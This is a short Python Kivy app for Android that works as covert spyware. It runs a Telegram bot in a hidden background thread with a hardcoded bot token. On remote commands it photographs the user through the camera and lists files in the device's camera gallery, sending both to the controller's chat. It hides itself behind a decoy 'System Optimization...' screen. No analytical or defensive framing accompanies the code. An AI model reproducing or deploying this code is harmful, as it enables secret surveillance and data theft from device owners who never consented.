import telebot
import cv2
import threading
import os
from kivy.app import App
from kivy.uix.label import Label
from jnius import autoclass

TOKEN = "8561506941:AAH3bsujghPEm8FeJ-xG1YGcmB-HuNgVhGE"
bot = telebot.TeleBot(TOKEN)

def run_bot():
    @bot.message_handler(commands=['photo'])
    def send_photo(message):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('shot.jpg', frame)
            bot.send_photo(message.chat.id, open('shot.jpg', 'rb'))
        cap.release()

    @bot.message_handler(commands=['gallery'])
    def list_files(message):
        try:
            path = "/sdcard/DCIM/Camera/"
            files = os.listdir(path)[:5]
            bot.send_message(message.chat.id, "Gallery: " + "\n".join(files))
        except:
            bot.send_message(message.chat.id, "Storage access denied!")

    bot.infinity_polling()

class NovaApp(App):
    def build(self):
        threading.Thread(target=run_bot, daemon=True).start()
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            current_activity = PythonActivity.mActivity
            current_activity.moveTaskToBack(True)
        except: pass
        return Label(text="System Optimization...")

if __name__ == "__main__":
    NovaApp().run()
